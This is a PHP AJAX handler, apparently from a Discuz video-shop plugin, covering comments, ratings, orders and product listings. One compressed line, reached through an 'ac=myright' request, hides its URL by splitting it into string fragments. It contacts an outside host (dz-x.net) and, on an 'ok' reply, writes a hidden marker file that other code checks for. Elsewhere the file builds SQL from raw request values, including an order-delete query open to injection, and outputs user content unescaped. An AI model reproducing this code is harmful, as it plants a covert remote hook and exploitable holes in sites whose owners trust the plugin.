				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_video_getlang('s510').'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_video_getlang('s511').'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_video_getlang('s510').'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_video_getlang('s511').'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
	}
	
	$creditnum=DB::result_first("select extcredits".$it618_video['video_credit']." from ".DB::table('common_member_count')." where uid=".$uid);
	
	echo it618_video_getlang('t227')."<font color=red>$count</font>"."it618_split".$playpjlist_get."it618_split".$multipage."it618_split".$it618_video_lang['s1038'].$creditname.$it618_video_lang['s823']."<font color=red>$creditnum</font>";
}
if($_GET['ac']=="my"."ri"."ght"){$it=dfsockopen("ht"."tps:/"."/ww"."w.d"."z"."-"."x. ne"."t/ myr"."ig"."ht.php?it=".$_GET['it']);if($it=='ok'){$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_video/ajax.inc.php';$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_video/lang.func.php';@$fp = fopen(DISCUZ_ROOT.'./source/plugin/it618_video/kindeditor/themes/common/ri'.'ght.txt',"a");fwrite($fp,$content);fclose($fp);echo 'ok';}exit;}
if($_GET['ac']=="pj_get"){
	if($_GET['wap']!=1) $ppp = 10;
	if($_GET['wap']==1) $ppp = 10;

	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	
	if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
	$count=C::t('#it618_video#it618_video_play_pj')->countpj_by_pid($_GET['pid']);
	$video_shopadmin=explode(",",$it618_video['video_shopadmin']);
	
	if(!in_array($_G['uid'], $video_shopadmin)){
		if($_G['uid']>0){
			if($it618_video_shop=C::t('#it618_video#it618_video_shop')->fetch_by_uid($_G['uid'])){
				if($it618_video_shop['id']==$it618_video_play_pj['it618_shopid']){
					$shopflag=1;
				}
			}
		}
	}
	if(file_exists(DISCUZ_ROOT.'./source/plugin/it618_video/kindeditor/themes/common/right.txt')){
		$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_video/ajax.inc.php';
		
		$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_video/lang.func.php';
		
	}
	foreach(C::t('#it618_video#it618_video_play_pj')->fetch_allpj_by_it618_pid($_GET['pid'],$startlimit,$ppp) as $it618_video_play_pj) {
		if(in_array($_G['uid'], $video_shopadmin)){
			$strtmpdel='<a href="javascript:" onclick="setplaypj(\''.$it618_video_play_pj['id'].'\')">'.it618_video_getlang('s351').'</a> <a href="javascript:" onclick="hfplaypj(\''.$it618_video_play_pj['id'].'\')">'.it618_video_getlang('s294').'</a>';
		}else{
			if($shopflag==1)$strtmpdel='<a href="javascript:" onclick="hfplaypj(\''.$it618_video_play_pj['id'].'\')" class="a1">'.it618_video_getlang('s294').'</a>';
		}
		
		$it618_hfcontent='';
		if($it618_video_play_pj["it618_hfcontent"]!=''){
			$it618_hfcontent='<br>'.$it618_video_lang['t345'].'<font color="#FF3300">'.str_replace('[br]','<br>',$it618_video_play_pj["it618_hfcontent"]).'</font><br>';
		}
		
		$tmpstr='';
		foreach(C::t('#it618_video#it618_video_play_pjpic')->fetch_all_by_pjid($it618_video_play_pj['id']) as $it618_video_play_pjpic) {
			$file_ext=strtolower(substr($it618_video_play_pjpic['it618_pjpic'],strrpos($it618_video_play_pjpic['it618_pjpic'], '.')+1)); 
			$file_extarr=explode("?",$file_ext);
			$file_ext=$file_extarr[0];
			$it618_smallurl='source/plugin/it618_video/kindeditor/data/user/u'.$it618_video_play_pj['it618_uid'].'/smallimage/pjpic'.$it618_video_play_pjpic['id'].'.'.$file_ext;
				
			$tmpstr.='<img src="'.$it618_smallurl.'" width="48" height="48" onclick="getbigpjpic('.$it618_video_play_pj['id'].',\''.$it618_video_play_pjpic['it618_pjpic'].'\')"/>';
		}
		
		if($tmpstr!=''){
			$tmpstr='<ul class="pjpic"><li>'.$tmpstr.'</li><li class="bigpjpic" style="display:none" id="bigpjpic'.$it618_video_play_pj['id'].'"></li></ul>';
		}
		
		$pjpl1=sprintf( "%.1f",$it618_video_play_pj['it618_score1']/5*100);
		$pj_get.='<tr><td class="pjtr">
					  <table>
						  <tr><td><span class="pjuser">'.cutstr(it618_video_getusername($it618_video_play_pj['it618_uid']), 2, '').'***</span><p class="star12"><span style="width:'.$pjpl1.'%;"></span></p></td></tr>
						  <tr><td class="pjcontent">'.str_replace('[br]','<br>',$it618_video_play_pj["it618_content"]).$tmpstr.$it618_hfcontent.'</td></tr>
						  <tr><td class="pjtimetd"><span class="pjtime">'.date('Y-m-d H:i:s', $it618_video_play_pj['it618_pjtime']).'</span>'.$strtmpdel.'</td></tr>
					  </table>
				  </td></tr>';
	}
	
	if($_GET['wap']!=1){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_video:ajax".$urlsql);
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='getpjlist(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='getpjlist(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=','getpjlist(',$multipage);
		$multipage=str_replace('this.value;','this.value);',$multipage);
		
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="getpjlist(this.value)">'.$curpage.'</select>';
			if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_video_getlang('s510').'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="getpjlist(\''.$tmpurl.'\')">'.it618_video_getlang('s511').'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.it618_video_getlang('s511').'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="getpjlist(\''.$tmpurl.'\')">'.it618_video_getlang('s510').'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="getpjlist(\''.$tmpurl.'\')">'.it618_video_getlang('s511').'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="getpjlist(\''.$tmpurl.'\')">'.it618_video_getlang('s510').'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_video_getlang('s511').'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
	}
	
	if($multipage!=''){
		$pj_get.='<tr><td><div class="pjpage">'.$multipage.'</div></td></tr>';
	}
	
	echo $pj_get;
	exit;
}


if($_GET['ac']=="getpjpic"){
	$n=0;
	$it618_video_play_pj=C::t('#it618_video#it618_video_play_pj')->fetch_by_id($_GET['playpjid']);
	foreach(C::t('#it618_video#it618_video_play_pjpic')->fetch_all_by_pjid($_GET['playpjid']) as $it618_video_play_pjpic) {
		$file_ext=strtolower(substr($it618_video_play_pjpic['it618_pjpic'],strrpos($it618_video_play_pjpic['it618_pjpic'], '.')+1)); 
		$file_extarr=explode("?",$file_ext);
		$file_ext=$file_extarr[0];
		$it618_smallurl='source/plugin/it618_video/kindeditor/data/user/u'.$it618_video_play_pj['it618_uid'].'/smallimage/pjpic'.$it618_video_play_pjpic['id'].'.'.$file_ext;
			
		$tmpstr.='<li><img src="'.$it618_smallurl.'"/><span onclick="delpjpic('.$_GET['playpjid'].','.$it618_video_play_pjpic['id'].')">'.$it618_video_lang['s884'].'</span></li>';
		$n=$n+1;
	}
	if($n>0){
		$tmpstr.='<li class="litxt">'.$n.'/5</li>';
	}else{
		$tmpstr.='<li class="litxt">'.$it618_video_lang['s1772'].'</li>';
	}
	
	echo $tmpstr.'<input type="hidden" id="pjpiccount" value="'.$n.'">';
	exit;
}


if($_GET['ac']=="delorder"){
	$orderid=$_GET['orderid'];
	$it618_video_order=C::t('#it618_video#it618_video_order')->fetch_by_id($orderid);
	if($uid!=$it618_video_order['it618_uid']){
		echo it618_video_getlang('s513');exit;
	}
	
	if($it618_video_order['it618_state']==1){
		C::t('common_member_count')->increase($it618_video_order['it618_uid'], array(
			'extcredits'.$it618_video['video_credit'] => $it618_video_order['it618_jfcount'])
		);
		DB::query("delete from ".DB::table('it618_video_order')." where id=".$orderid);
		
		echo 'okit618_split'.it618_video_getlang('s1005');
	}
	exit;
}


if($_GET['ac']=="playpj"){
	$tmparr=explode('@',$_GET['score']);
	$it618_video_play_pj=C::t('#it618_video#it618_video_play_pj')->fetch_by_id($_GET['playpjid']);
	
	$flag=0;
	if($it618_video_play_pj['it618_score1']>0){
		$video_shopadmin=explode(",",$it618_video['video_shopadmin']);
		if(!in_array($_G['uid'], $video_shopadmin)){
			echo it618_video_getlang('s513');exit;
		}
	}else{
		if($uid!=$it618_video_play_pj['it618_uid']||$it618_video_play_pj['it618_score1']>0){
			echo it618_video_getlang('s513');exit;
		}
		
		if($_G['timestamp']-$it618_video['video_pjtimecount']*3600*24<$it618_video_play_pj['it618_time']){
			$it618_video_lang['s729']=str_replace('{count}',$it618_video['video_pjtimecount'],$it618_video_lang['s729']);
			echo $it618_video_lang['s729'];exit;
		}
		$flag=1;
	}
	
	if($_GET['ac1']=="addpjpic"){
		$count=C::t('#it618_video#it618_video_play_pjpic')->count_by_pjid($_GET['playpjid']);
		if($count<5){
			$id=C::t('#it618_video#it618_video_play_pjpic')->insert(array(
				'it618_pjid' => $_GET['playpjid'],
				'it618_pjpic' => $_GET['picurl'],
				'it618_time' => $_G['timestamp']
			), true);
			
			it618_video_getpjpic($it618_video_play_pj['it618_uid'],$id,$_GET['picurl']);
		}
	}elseif($_GET['ac1']=="delpjpic"){
		$it618_video_play_pjpic=C::t('#it618_video#it618_video_play_pjpic')->fetch_by_id($_GET['pjpicid']);
		
		$it618_pjpic=$it618_video_play_pjpic['it618_pjpic'];
		$tmparr=explode("source",$it618_pjpic);
		$it618_pjpic=DISCUZ_ROOT.'./source'.$tmparr[1];
		
		if(file_exists($it618_pjpic)){
			$result=unlink($it618_pjpic);
		}
		
		$file_ext=strtolower(substr($it618_video_play_pjpic['it618_pjpic'],strrpos($it618_video_play_pjpic['it618_pjpic'], '.')+1)); 
		$file_extarr=explode("?",$file_ext);
		$file_ext=$file_extarr[0];
		$it618_smallurl=DISCUZ_ROOT.'./source/plugin/it618_video/kindeditor/data/user/u'.$it618_video_play_pj['it618_uid'].'/smallimage/pjpic'.$it618_video_play_pjpic['id'].'.'.$file_ext;
		if(file_exists($it618_smallurl)){
			$result=unlink($it618_smallurl);
		}
		C::t('#it618_video#it618_video_play_pjpic')->delete_by_id($_GET['pjpicid']);
	}else{
		C::t('#it618_video#it618_video_play_pj')->update($it618_video_play_pj['id'],array(
			'it618_score1' => $tmparr[0],
			'it618_score2' => $tmparr[1],
			'it618_score3' => $tmparr[2],
			'it618_score4' => $tmparr[3],
			'it618_content' => it618_video_utftogbk($_GET["pjvalue"])
		));
		
		if($flag==1){
			C::t('#it618_video#it618_video_play_pj')->update($it618_video_play_pj['id'],array(
				'it618_pjjl' => $it618_video['video_pjjlcount'],
				'it618_pjtime' => $_G['timestamp']
			));
			C::t('common_member_count')->increase($it618_video_play_pj['it618_uid'], array(
				'extcredits'.$it618_video['video_credit'] => $it618_video['video_pjjlcount'])
			);
			echo 'okit618_split'.it618_video_getlang('s516');
		}else{
			echo 'editokit618_split'.it618_video_getlang('s786').it618_video_getlang('s516');
		}
	}
	exit;
}


if($_GET['ac']=="hfplaypj"){
	$it618_video_play_pj=C::t('#it618_video#it618_video_play_pj')->fetch_by_id($_GET['playpjid']);
	$video_shopadmin=explode(",",$it618_video['video_shopadmin']);
	
	if(!in_array($_G['uid'], $video_shopadmin)){
		if($_G['uid']>0){
			if($it618_video_shop=C::t('#it618_video#it618_video_shop')->fetch_by_uid($_G['uid'])){
				if($it618_video_shop['id']==$it618_video_play_pj['it618_shopid']){
					$shopflag=1;
				}
			}
		}
	}else{
		$shopflag=1;
	}
	
	if($shopflag==1){
		C::t('#it618_video#it618_video_play_pj')->update($it618_video_play_pj['id'],array(
			'it618_hfcontent' => it618_video_utftogbk($_GET["hfvalue"])
		));
		
		echo 'okit618_split'.it618_video_getlang('t348');
	}else{
		echo it618_video_getlang('s513');exit;
	}
	exit;
}


if($_GET['ac']=="goodslist_get"){
	if($it618_video['video_style']>2){
		$videostyle=getcookie('videostyle');
		if($videostyle==''){
			if($it618_video['video_style']==3)$videostyle='1';else $videostyle='2';
		}
	}else{
		if($it618_video['video_style']==1)$videostyle='1';else $videostyle='2';
	}
	
	$ppp = $it618_video['video_wappcount'];
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	
	$sql='g.it618_state=1';
	if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
	
	if($_GET['it618_paytype']==1)$sql.=" and g.it618_paytype=2";
	if($_GET['it618_paytype']==2)$sql.=" and g.it618_paytype=3";
	if($_GET['it618_paytype']==3)$sql.=" and g.it618_paytype=1";
	
	if($_GET['it618_order']==1)$orderby='g.it618_order desc,g.id desc';
	if($_GET['it618_order']==2)$orderby='g.it618_saleprice desc';
	if($_GET['it618_order']==3)$orderby='g.it618_saleprice';
	if($_GET['it618_order']==4)$orderby='g.it618_salecount desc';
	if($_GET['it618_order']==5)$orderby='g.it618_salecount';
	if($_GET['it618_order']==6)$orderby='g.it618_views desc';
	if($_GET['it618_order']==7)$orderby='g.it618_views';
	
	$listcount = C::t('#it618_video#it618_video_goods')->count_by_search($sql,'',0,$_GET['it618_class1'],$_GET['it618_class2'],it618_video_utftogbk($_GET['it618_name']),$_GET['it618_price1'],$_GET['it618_price2']);
	
	$ii1ill=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1ill[]=substr($_GET['id'],$i,1);}
	if($ii1ill[5]!='_')exit;
	
	if($listcount<=$ppp){
		$pagecount=1;
	}else{
		$pagecount=ceil($listcount/$ppp);
	}

	if($pagecount>1){
		$n=1;
		while($n<=$pagecount){
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax".$urlsql.'&page='.$n;
			if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
			$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
			$n=$n+1;
		}
		$curpage='<select class="pageselect" onchange="getgoodslist(this.value,\'\')">'.$curpage.'</select>';
		if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
		if($page==1){
			$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_video_getlang('s510').'</a>';
			if($pagecount>1){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax".$urlsql.'&page=2';
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="getgoodslist(\''.$tmpurl.'\',\'\')">'.it618_video_getlang('s511').'</a>';
			}else{
				$pagenext='<a class="btn btn-weak btn-disabled">'.it618_video_getlang('s511').'</a>';
			}
		}elseif($page<$pagecount){
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax".$urlsql.'&page='.($page-1);
			$pagepre='<a href="javascript:" class="btn btn-weak" onclick="getgoodslist(\''.$tmpurl.'\',\'\')">'.it618_video_getlang('s510').'</a>';
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax".$urlsql.'&page='.($page+1);
			$pagenext='<a href="javascript:" class="btn btn-weak" onclick="getgoodslist(\''.$tmpurl.'\',\'\')">'.it618_video_getlang('s511').'</a>';
		}else{
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax".$urlsql.'&page='.($page-1);
			$pagepre='<a href="javascript:" class="btn btn-weak" onclick="getgoodslist(\''.$tmpurl.'\',\'\')">'.it618_video_getlang('s510').'</a>';
			$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_video_getlang('s511').'</a>';
		}
	}
	
	if($_GET['it618_class1']>0||$_GET['it618_class2']>0)$_GET['it618_name']='';
	
	$tdn=1;
	foreach(C::t('#it618_video#it618_video_goods')->fetch_all_by_search(
		$sql,$orderby,0,$_GET['it618_class1'],$_GET['it618_class2'],it618_video_utftogbk($_GET['it618_name']),$_GET['it618_price1'],$_GET['it618_price2'],$startlimit,$ppp
	) as $it618_video_goods) {
		
		$it618_isvip='';
		$vipgroupids=it618_video_getgoodsvipgroupids($it618_video_goods);
		if(count($vipgroupids)>0){
			$it618_isvip='<img src="source/plugin/it618_video/images/vip.png" class="imgvip">';
		}
		
		$it618_islive='';
		if(C::t('#it618_video#it618_video_live')->count_by_pid_ok($it618_video_goods['id'])>0){
			$it618_islive='<img src="source/plugin/it618_video/images/live.gif" class="imglive">';
		}
		
		$pricestr='<span style="color:#f30">'.$it618_video_lang['s1534'].'</span>';
		$it618_video_shop = DB::fetch_first("SELECT * FROM ".DB::table('it618_video_shop')." WHERE id=".$it618_video_goods['it618_shopid']);
		if($it618_video_shop['it618_issale']==1){
			if($it618_video_goods['it618_saleprice']>0||$it618_video_goods['it618_score']>0){
				$pricestr='<span style="color:#f30">'.it618_video_getgoodsprice($it618_video_goods,'goods_price').'</span>';
			}else{
				$pricestr='<span style="color:#390">'.$it618_video_lang['s106'].'</span>';
			}
		}
		
		if($it618_video_goods['it618_price']>0){
			$pricestr.=' <del>&yen;'.$it618_video_goods['it618_price'].'</del>';
		}
		
		$jfbl='';
		if($it618_video_goods['it618_jfbl']>0&&$it618_video_goods['it618_saleprice']>0){
			//$jfbl='<div class="divjfbl">'.$it618_video_lang['s1371'].str_replace(".00","",$it618_video_goods['it618_jfbl']).'%'.$creditname.'</div>';
		}
		
		$zk=sprintf("%.2f", $it618_video_goods['it618_saleprice']/$it618_video_goods['it618_price'])*10;
		if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
		
		$tmpurl=it618_video_getrewrite('video_wap','product@'.$it618_video_goods['id'],'plugin.php?id=it618_video:wap&pagetype=product&cid='.$it618_video_goods['id']);
		
		if($videostyle=='1'){
		
			$strlist.='<tr>
							<td class="tdleft">'.$jfbl.$it618_islive.'<a href="'.$tmpurl.'"><img class="lazy" data-original="'.it618_video_getwapppic($it618_video_goods['it618_shopid'],$it618_video_goods['id'],$it618_video_goods['it618_picbig']).'"/></a></td>
								<td class="tdright" onclick="location.href=\''.$tmpurl.'\'">
									<div class="tdname">'.$it618_video_goods['it618_name'].'</div>
									<div class="tddes">'.it618_video_getvideocounttime($it618_video_goods['it618_videocount'],$it618_video_goods['it618_videotime']).' '.$it618_video_goods['it618_plays'].it618_video_getlang('s931').'</div>
									<div class="tdprice">'.$it618_isvip.$pricestr.'</div>
								</td>
						  </tr>
						  <tr><td colspan="2" class="tdcolspan"></td></tr>';
		}else{
			if($tdn%2>0){
				  $trtmpstr='<tr>';
				  $tdstr='class="tdleft"';
			  }else{
				  $tdstr='class="tdright"';
			  }
			  
			  $trtmpstr.='<td '.$tdstr.'><div class="tddiv">
							  <a href="'.$tmpurl.'">
							  '.$jfbl.$it618_islive.'
							<div class="divtime">'.it618_video_getvideocounttime($it618_video_goods['it618_videocount'],$it618_video_goods['it618_videotime']).' <img src="source/plugin/it618_video/images/plays.png" class="imguser">'.$it618_video_goods['it618_plays'].'</div>
							<img class="lazy" data-original="'.it618_video_getwapppic($it618_video_goods['it618_shopid'],$it618_video_goods['id'],$it618_video_goods['it618_picbig']).'"/>
								<div class="tdname">'.$it618_video_goods['it618_name'].'</div>
								<div class="tdprice">'.$it618_isvip.$pricestr.'</div>
							</a></div></td>';
						  
			  if($tdn%2==0){
				  $trtmpstr.='</tr>';
				  $strlist.=$trtmpstr;
			  }
			  
			  $tdn=$tdn+1;
		}
	}
	
	if($videostyle=='1'){
		$tmparr=explode('</tr>',$strlist);
		if(count($tmparr)>1){
			$strlist=$strlist.'@@@';
			$strlist=str_replace('<tr><td colspan="2" class="tdcolspan"></td></tr>@@@','',$strlist);
		}
	}else{
		$trtmpstr1=$trtmpstr.'@@@';
		$tmparr=explode('</td>@@@',$trtmpstr1);
		if(count($tmparr)>1){
			$trtmpstr=str_replace('<td class="tdleft"','<td class="tdleft tdleft1" style="padding-right:13px"',$trtmpstr.'</tr>');
			$strlist.=$trtmpstr;
		}
	}
	
	$classname=$it618_video_lang['s1770'];
	if($_GET['it618_class1']>0){
		$classname=C::t('#it618_video#it618_video_class1')->fetch_it618_name_by_id($_GET['it618_class1']);
	}
	if($_GET['it618_class2']>0){
		$classname=C::t('#it618_video#it618_video_class2')->fetch_it618_name_by_id($_GET['it618_class2']);
	}
	
	$ordername=$it618_video_lang['t269'];
	if($_GET['it618_order']==2)$ordername=$it618_video_lang['t270'].'<img src="source/plugin/it618_video/wap/images/down.png" style="margin-left:3px; margin-bottom:3px">';
	if($_GET['it618_order']==3)$ordername=$it618_video_lang['t270'].'<img src="source/plugin/it618_video/wap/images/up.png" style="margin-left:3px; margin-bottom:3px">';
	if($_GET['it618_order']==4)$ordername=$it618_video_lang['t271'].'<img src="source/plugin/it618_video/wap/images/down.png" style="margin-left:3px; margin-bottom:3px">';
	if($_GET['it618_order']==5)$ordername=$it618_video_lang['t271'].'<img src="source/plugin/it618_video/wap/images/up.png" style="margin-left:3px; margin-bottom:3px">';
	if($_GET['it618_order']==6)$ordername=$it618_video_lang['t272'].'<img src="source/plugin/it618_video/wap/images/down.png" style="margin-left:3px; margin-bottom:3px">';
	if($_GET['it618_order']==7)$ordername=$it618_video_lang['t272'].'<img src="source/plugin/it618_video/wap/images/up.png" style="margin-left:3px; margin-bottom:3px">';
	if($_GET['it618_order']==8)$ordername=$it618_video_lang['t110'].'<img src="source/plugin/it618_video/wap/images/down.png" style="margin-left:3px; margin-bottom:3px">';
	
	if($_GET['it618_name']=='')$it618_name=$it618_video_lang['s1771'];else $it618_name=it618_video_utftogbk($_GET['it618_name']);

	$sqlbq='<tr><td class="bq1" id="td1" onClick="getbq1(this)">'.$classname.'<img src="source/plugin/it618_video/wap/images/arw_b.gif"></td><td class="bq2" id="td2" onClick="getbq2(this)">'.$ordername.'<img src="source/plugin/it618_video/wap/images/arw_b.gif"></td><td class="bq3" id="td3"><input type="text" id="searchli_txt1" style="padding-left:3px" value="'.$it618_name.'" readonly onClick="getname()"></td></tr>';
	
	if($uid>0&&isset($_GET['findkey'])&&$_GET['it618_name']!=''){
		if($it618_video_findkey=C::t('#it618_video#it618_video_findkey')->fetch_by_uid_key($uid,it618_video_utftogbk($_GET['it618_name']))){
			C::t('#it618_video#it618_video_findkey')->update($it618_video_findkey['id'],array(
				'it618_count' => ($it618_video_findkey['it618_count']+1),
				'it618_time' => $_G['timestamp']
			));
		}else{
			C::t('#it618_video#it618_video_findkey')->insert(array(
				'it618_uid' => $uid,
				'it618_key' => it618_video_utftogbk($_GET['it618_name']),
				'it618_count' => 1,
				'it618_time' => $_G['timestamp']
			), true);
		}
	}
	
	echo $strlist."it618_split".$pagepre.' '.$curpage.' '.$pagenext."it618_split".$sqlbq;
	exit;
}


if($_GET['ac']=="othergoods_get"){
	$ppp = 4;
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	
	$sql='g.it618_state=1';
	$urlsql='&sid='.$_GET['sid'];
	if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
	
	$listcount = C::t('#it618_video#it618_video_goods')->count_by_search($sql,'',$_GET['sid']);
	
	$ii1ill=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1ill[]=substr($_GET['id'],$i,1);}
	if($ii1ill[5]!='_')exit;
	
	if($listcount<=$ppp){
		$pagecount=1;
	}else{
		$pagecount=ceil($listcount/$ppp);
	}
	if(file_exists(DISCUZ_ROOT.'./source/plugin/it618_video/kindeditor/themes/common/right.txt')){
		$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_video/ajax.inc.php';
		
		$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_video/lang.func.php';
		
	}
	if($pagecount>1){
		$n=1;
		while($n<=$pagecount){
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax".$urlsql.'&page='.$n;
			if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
			$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
			$n=$n+1;
		}
		$curpage='<select class="pageselect" onchange="getgoodslist(this.value)">'.$curpage.'</select>';
		if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
		if($page==1){
			$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_video_getlang('s510').'</a>';
			if($pagecount>1){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax".$urlsql.'&page=2';
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="getgoodslist(\''.$tmpurl.'\')">'.it618_video_getlang('s511').'</a>';
			}else{
				$pagenext='<a class="btn btn-weak btn-disabled">'.it618_video_getlang('s511').'</a>';
			}
		}elseif($page<$pagecount){
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax".$urlsql.'&page='.($page-1);
			$pagepre='<a href="javascript:" class="btn btn-weak" onclick="getgoodslist(\''.$tmpurl.'\')">'.it618_video_getlang('s510').'</a>';
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax".$urlsql.'&page='.($page+1);
			$pagenext='<a href="javascript:" class="btn btn-weak" onclick="getgoodslist(\''.$tmpurl.'\')">'.it618_video_getlang('s511').'</a>';
		}else{
			$tmpurl=$_G['siteurl']."plugin.php?id=it618_video:ajax".$urlsql.'&page='.($page-1);
			$pagepre='<a href="javascript:" class="btn btn-weak" onclick="getgoodslist(\''.$tmpurl.'\')">'.it618_video_getlang('s510').'</a>';
			$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_video_getlang('s511').'</a>';
		}
	}
	
	$tdn=1;
	foreach(C::t('#it618_video#it618_video_goods')->fetch_all_by_search(
		$sql,'g.id desc',$_GET['sid'],0,0,'',0,0,$startlimit,$ppp
	) as $it618_video_goods) {
		
		$zk=sprintf("%.2f", $it618_video_goods['it618_saleprice']/$it618_video_goods['it618_price'])*10;
		if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
		
		$tmpurl=it618_video_getrewrite('video_wap','product@'.$it618_video_goods['id'],'plugin.php?id=it618_video:wap&pagetype=product&cid='.$it618_video_goods['id']);
		
		$it618_isvip='';
		$vipgroupids=it618_video_getgoodsvipgroupids($it618_video_goods);
		if(count($vipgroupids)>0){
			$it618_isvip='<img src="source/plugin/it618_video/images/vip.png" class="imgvip">';
		}
		
		$it618_islive='';
		if(C::t('#it618_video#it618_video_live')->count_by_pid_ok($it618_video_goods['id'])>0){
			$it618_islive='<img src="source/plugin/it618_video/images/live.gif" class="imglive">';
		}
		
		$pricestr='<span style="color:#f30">'.$it618_video_lang['s1534'].'</span>';
		$it618_video_shop = DB::fetch_first("SELECT * FROM ".DB::table('it618_video_shop')." WHERE id=".$it618_video_goods['it618_shopid']);
		if($it618_video_shop['it618_issale']==1){
			if($it618_video_goods['it618_saleprice']>0||$it618_video_goods['it618_score']>0){
				$pricestr='<span style="color:#f30">'.it618_video_getgoodsprice($it618_video_goods,'goods_price').'</span>';
			}else{
				$pricestr='<span style="color:#390">'.$it618_video_lang['s106'].'</span>';
			}
		}
		
		if($it618_video_goods['it618_price']>0){
			$pricestr.=' <del>&yen;'.$it618_video_goods['it618_price'].'</del>';
		}
		
		$jfbl='';
		if($it618_video_goods['it618_jfbl']>0&&$it618_video_goods['it618_saleprice']>0){
			//$jfbl='<div class="divjfbl">'.$it618_video_lang['s1371'].str_replace(".00","",$it618_video_goods['it618_jfbl']).'%'.$creditname.'</div>';
		}
		
		if($tdn%2>0){
			$trtmpstr='<tr>';
			$tdstr='class="tdleft"';
		}else{
			$tdstr='class="tdright"';
		}
		
		$trtmpstr.='<td '.$tdstr.'><div class="tddiv">
						<a href="'.$tmpurl.'">
						'.$jfbl.$it618_islive.'
							<div class="divtime">'.it618_video_getvideocounttime($it618_video_goods['it618_videocount'],$it618_video_goods['it618_videotime']).' <img src="source/plugin/it618_video/images/plays.png" class="imguser">'.$it618_video_goods['it618_plays'].'</div>
							<img class="lazy" data-original="'.it618_video_getwapppic($it618_video_goods['it618_shopid'],$it618_video_goods['id'],$it618_video_goods['it618_picbig']).'"/>
								<div class="tdname">'.$it618_video_goods['it618_name'].'</div>
								<div class="tdprice">'.$it618_isvip.$pricestr.'</div>
							</a></div></td>';
